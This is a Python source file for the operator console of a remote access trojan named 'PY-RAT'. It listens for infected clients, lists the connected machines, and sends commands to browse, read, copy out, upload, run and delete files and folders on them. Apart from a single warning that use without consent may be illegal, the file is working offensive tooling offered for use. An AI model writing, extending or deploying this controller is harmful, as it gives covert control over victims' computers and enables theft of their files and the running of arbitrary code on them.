import socket
import os
from uuid import uuid4
import threading

# Allow colors to be processed properly
os.system('')

print('\u001b[38;2;255;255;255m')
print('\u001b[40m')

ADDR = socket.gethostbyname(socket.gethostname())

while True:
    ans = input('WOULD YOU LIKE PY-RAT TO AUTO-DETECT YOUR IP ADDRESS? (Y/N) : ')
    if ans.lower() == 'n':
        while True:
            ADDR = input('ENTER YOUR THE IP ADDRESS YOU WOULD LIKE TO USE : ').strip()
            ans = input('ARE YOU SURE THAT THE IP ADDRESS YOU ENTERED IS CORRECT (IT WILL CAUSE ERRORS IF NOT)? (Y/N) : ')
            if ans.lower() == 'y':
                break
    break

try:
    os.system('cls')
except:
    os.system('clear')

TITLE = \
"""
 _______   __      __       _______    ______   ________ 
/       \ /  \    /  |     /       \  /      \ /        |
$$$$$$$  |$$  \  /$$/      $$$$$$$  |/$$$$$$  |$$$$$$$$/ 
$$ |__$$ | $$  \/$$/______ $$ |__$$ |$$ |__$$ |   $$ |   
$$    $$/   $$  $$//      |$$    $$< $$    $$ |   $$ |   
$$$$$$$/     $$$$/ $$$$$$/ $$$$$$$  |$$$$$$$$ |   $$ |   
$$ |          $$ |         $$ |  $$ |$$ |  $$ |   $$ |   
$$ |          $$ |         $$ |  $$ |$$ |  $$ |   $$ |   
$$/           $$/          $$/   $$/ $$/   $$/    $$/    
"""

HELP_MSG = \
f"""
AVAILABLE COMMANDS:

-help | Displays all available commands

-ls | Lists all the files in the currect connection directory

-cd [folder on connected computer, ..] | Navigates through the current connection directory

-goto [directory on connected computer] | Changes the current connection directory to the directory

-size [file on connected computer] | Returns the size of a file

-read [file on connected computer] | Returns the contents of a file

-write [file on this computer] | Puts the file on this computer onto the connected computer in the current connection directory

-copy [file on connected computer] | Copies the file from the connected computer into the current working directory ({os.getcwd()})

-run [file on the connected computer] | Runs the file on the connected computer

-rm [file on connected computer] | Deletes the file

-mkdir [folder name] | Creates a folder of "folder name" on the connected computer

-rmdir [folder name] | Deletes a folder of "folder name" on the connected computer

-exit | Exit your connection
"""

CONNECTIONS = {}

def recvall(connection):

    data = ''
    
    data += connection.recv(4096).decode()

    dataSplit, data = data.split('|', 1)

    if dataSplit in data:
            data = data.replace('|' + dataSplit, '')
            return data

    while True:

        data += connection.recv(4096).decode()

        if dataSplit in data:
            data = data.replace('|' + dataSplit, '')
            return data

def getMsgWithDataSplit(msg):

    dataSplit = str(uuid4())

    return (dataSplit + '|' + msg + '|' + dataSplit).encode()

def makeConnections():

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

        try:
            s.bind((ADDR, PORT))
        except:
            raise ValueError('INVALID BINDING ADDRESS OR PORT. PLEASE RESTART PY-RAT!')

        while True:

            s.listen()

            connection, address = s.accept()

            CONNECTIONS[address[0]] = connection

print('\u001b[38;2;74;246;38m')
print(TITLE)
print('\u001b[38;2;255;0;0m')
print('WARNING: BE CAUTIOUS WHILE USING PY-RAT AS IT CAN BE ILLEGAL WITHOUT CONSENT!')
print('\u001b[38;2;0;0;255m')
print('\nFULL CREDITS GO TO ALEX JANDO\n')
print('\u001b[38;2;255;255;255m')

while True:
    try:
        PORT = int(input('ENTER A VALID PORT NUMBER (CLIENTS WILL USE THIS ADDRESS TO CONNECT) : '))
        CONNECTION_THREAD = threading.Thread(target = makeConnections, daemon = True)
        CONNECTION_THREAD.start()
        print(f'\nRAT HOSTED AT \u001b[38;2;0;0;255m{ADDR}:{PORT}\u001b[38;2;255;255;255m (LOCAL ADDRESS)')
        break
    except:
        print('ENTER A VALID PORT NUMBER (0 TO 65536). CANNOT ALREADY BE IN USE! ENTERED IP ADDRESS INCORECT RESTART PROGRAM.')

while True:

    print('\nALL CURRENT CONNECTIONS :\n')
    print(''.join([f'{int(index) + 1} - {address}\n' for index, address in enumerate(CONNECTIONS)]))
    print('\nType "refresh" to refresh the connections...')
    print('Type "cls" to clear the terminal...')
    print('Type "exit" to exit the program...')
    print('\n')

    connectionChoice = input('Enter the address you want to connect to >>> ').strip()

    if connectionChoice.lower() == 'exit':
        for address in CONNECTIONS:
            CONNECTIONS[address].close()
        break

    elif connectionChoice.lower() == 'cls':
        try:
            os.system('cls')
        except:
            os.system('clear')

    elif connectionChoice.lower() == 'refresh':
        deadConns = []
        for address in CONNECTIONS:
            try:
                CONNECTIONS[address].sendall(getMsgWithDataSplit('Refresh'))
                recvall(CONNECTIONS[address])
            except:
                deadConns.append(address)

        for deadConn in deadConns:
            CONNECTIONS.pop(deadConn)

    else:
        try:
            connectionChoice = int(connectionChoice) - 1

            CONNECTION_ADDR = list(CONNECTIONS.keys())[connectionChoice]

            try:

                CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('EstablishConnection'))

            except:

                print(f'{CONNECTION_ADDR} has disconected')
                CONNECTIONS.pop(CONNECTION_ADDR)
                CONNECTION_ADDR = ''

            CURRENT_CONNECTION_DIRECTORY = recvall(CONNECTIONS[CONNECTION_ADDR]).strip('\\')

            print(f'\nCONNECTED TO: {CONNECTION_ADDR}\n')

            try:

                while True:

                    if not CONNECTION_ADDR:
                        break

                    command = input(f'{CURRENT_CONNECTION_DIRECTORY} >>> ').strip().lower().split(' ')[0]

                    if command == 'help':
                        print(HELP_MSG)

                    elif command == 'ls':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('ls'))
                        data = recvall(CONNECTIONS[CONNECTION_ADDR])
                        if data == 'ERROR':
                            print('INVALID PERMISSIONS OR DIRECTORY!')
                        else:
                            print(f'ALL FILES IN: {CURRENT_CONNECTION_DIRECTORY}\n')
                            print(''.join([f'{directory}\n' for directory in eval(data)]))

                    elif command == 'cd':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('cd'))
                        folder = input('Enter the folder >>> ')
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(folder)))
                        data = recvall(CONNECTIONS[CONNECTION_ADDR])
                        if data == 'ERROR':
                            print('INVALID PERMISSIONS OR DIRECTORY!')
                        else:
                            CURRENT_CONNECTION_DIRECTORY = data

                    elif command == 'goto':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('goto'))
                        directory = input('Enter the directory >>> ')
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(directory)))
                        data = recvall(CONNECTIONS[CONNECTION_ADDR])
                        if data == 'ERROR':
                            print('INVALID PERMISSIONS OR DIRECTORY!')
                        else:
                            CURRENT_CONNECTION_DIRECTORY = data

                    elif command == 'size':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('size'))
                        file = input('Enter the file >>> ')
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(file)))
                        data = recvall(CONNECTIONS[CONNECTION_ADDR])
                        if data == 'ERROR':
                            print('INVALID PERMISSIONS OR DIRECTORY!')
                        else:
                            print(f'The size of {file} is {data} bytes')

                    elif command == 'read':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('read'))
                        file = input('Enter the file >>> ')
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(file)))
                        data = recvall(CONNECTIONS[CONNECTION_ADDR])
                        print(f'Contents of {file} :\n')
                        if data == 'ERROR':
                            print('INVALID PERMISSIONS OR DIRECTORY!')
                        else:
                            try:
                                print(data + '\n')
                            except KeyboardInterrupt:
                                print(f'\n\nCRTL+C PRESSED!\n\n')

                    elif command == 'write':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('write'))
                        fileName = input('Enter the file >>> ')
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(fileName))
                        try:
                            with open(fileName, 'r') as f:
                                file = f.read()

                            CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(file))

                            fileSavePath = recvall(CONNECTIONS[CONNECTION_ADDR])

                            if fileSavePath == 'ERROR':
                                print(f'FAILED TO COPY {file}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
                            else:
                                print(f'File successfully written and saved to {fileSavePath}')
                        except:
                            try:
                                with open(fileName, 'rb') as f:
                                    file = f.read()

                                CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(file)))

                                fileSavePath = recvall(CONNECTIONS[CONNECTION_ADDR])

                                if fileSavePath == 'ERROR':
                                    print(f'FAILED TO COPY {file}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
                                else:
                                    print(f'File successfully written and saved to {fileSavePath}')
                            except:
                                CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('ERROR'))
                                print(f'File {fileName} not found or is unreadable!')                        

                    elif command == 'copy':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('copy'))
                        file = input('Enter the file >>> ')
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(file)))
                        data = recvall(CONNECTIONS[CONNECTION_ADDR])
                        if data == 'ERROR':
                            print(f'FAILED TO COPY {file}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
                        else:
                            try:
                                if type(eval(data)) == bytes:
                                    with open(file, 'wb') as f:
                                        f.write(eval(data))
                                else:
                                    with open(file,'w') as f:
                                        f.write(data)
                            except:
                                with open(file,'w') as f:
                                        f.write(data)

                            print(f'File copied and saved successfully to {os.path.join(os.getcwd(), file)}!')

                    elif command == 'run':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('run'))
                        file = input('Enter the file >>> ')
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(file)))
                        data = recvall(CONNECTIONS[CONNECTION_ADDR])
                        if data == 'ERROR':
                            print(f'FAILED TO RUN {file}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
                        else:
                            print('File ran successfully')

                    elif command == 'rm':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('rm'))
                        file = input('Enter the file >>> ')
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(file)))
                        data = recvall(CONNECTIONS[CONNECTION_ADDR])
                        if data == 'ERROR':
                            print(f'FAILED TO REMOVE {file}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
                        else:
                            print('File deleted successfully')

                    elif command == 'mkdir':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('mkdir'))
                        folder = input('Enter the folder >>> ')
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(folder)))
                        data = recvall(CONNECTIONS[CONNECTION_ADDR])
                        if data == 'ERROR':
                            print(f'FAILED TO CREATE {folder}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
                        else:
                            print(f'Folder {folder} created successfully')
                    
                    elif command == 'rmdir':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('rmdir'))
                        folder = input('Enter the folder >>> ')
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit(str(folder)))
                        data = recvall(CONNECTIONS[CONNECTION_ADDR])
                        if data == 'ERROR':
                            print(f'FAILED TO REMOVE {folder}! ENSURE IT\'S THE CORRECT PATH AND PERMISSION!')
                        else:
                            print(f'Folder {folder} removed successfully')

                    elif command == 'cls':
                        try:
                            os.system('cls')
                        except:
                            os.system('clear')

                    elif command == 'exit':
                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('CloseConnection'))
                        CONNECTION_ADDR = ''
                        CURRENT_CONNECTION_DIRECTORY = ''
                        break

                    else:
                        print(f'COMMAND: {command} IS INVALID')
                        print(HELP_MSG)

            except:
                CONNECTION_ADDR = ''
                CURRENT_CONNECTION_DIRECTORY = ''
                CONNECTIONS.pop(CONNECTION_ADDR)
                print('\nCONNECTION WAS FORCED CLOSED\n')

        except:
            print('\nPLEASE CHOOSE A VAILD CONNECTION!\n')
